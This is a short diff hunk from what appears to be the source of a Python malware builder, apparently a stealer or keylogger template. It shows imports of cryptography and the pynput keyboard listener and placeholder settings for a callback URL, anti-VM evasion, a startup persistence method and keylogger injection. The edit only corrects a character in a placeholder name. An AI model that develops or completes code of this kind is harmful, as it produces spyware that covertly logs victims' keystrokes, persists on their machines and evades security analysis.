@@ -6,7 +6,7 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from pynput import keyboard
 
-UrLxD = '%REPLACE_ME_FOR_QUİCADXD%'
+UrLxD = '%REPLACE_ME_FOR_QUICADXD%'
 Anti_Vm = bool('%AnTiVm%')
 startup_xd = "'%StartupMethod%'"
 injectKeylogger = bool('%Keylogger%')
